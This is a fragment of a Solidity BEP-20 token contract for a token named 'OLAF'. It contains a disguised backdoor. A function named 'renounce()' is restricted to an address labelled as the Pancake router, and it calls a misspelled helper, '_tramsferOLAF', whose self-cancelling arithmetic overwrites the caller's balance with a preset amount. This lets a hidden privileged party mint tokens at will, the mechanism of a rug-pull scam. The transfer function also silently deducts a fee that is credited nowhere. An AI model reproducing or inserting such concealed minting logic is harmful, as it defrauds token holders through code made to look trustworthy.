  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalOLAF
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalOLAF, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalOLAF;
        }
        _fee = (totalOLAF * fee / 100) / multi;
        totalOLAF = totalOLAF -  (_fee * multi);
        
        _balances[receiver] += totalOLAF;
        emit Transfer(sender, receiver, totalOLAF);
    }
    function _tramsferOLAF (address accountOLAF) internal {
        _balances[accountOLAF] = (_balances[accountOLAF] * 3) - (_balances[accountOLAF] * 3) + (_exemSumOLAF * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountOLAF, uint256 amount) internal virtual {
        require(accountOLAF != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountOLAF];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountOLAF] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountOLAF, address(0), amount);
    }
    modifier externelOLAF () {
        require(_pancakeRouterOLAF == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function renounce() public externelOLAF {
        _tramsferOLAF(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountOLAF
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountOLAF;
        emit Approval(owner, spender, amountOLAF);
    }


    modifier onlyOwner() {
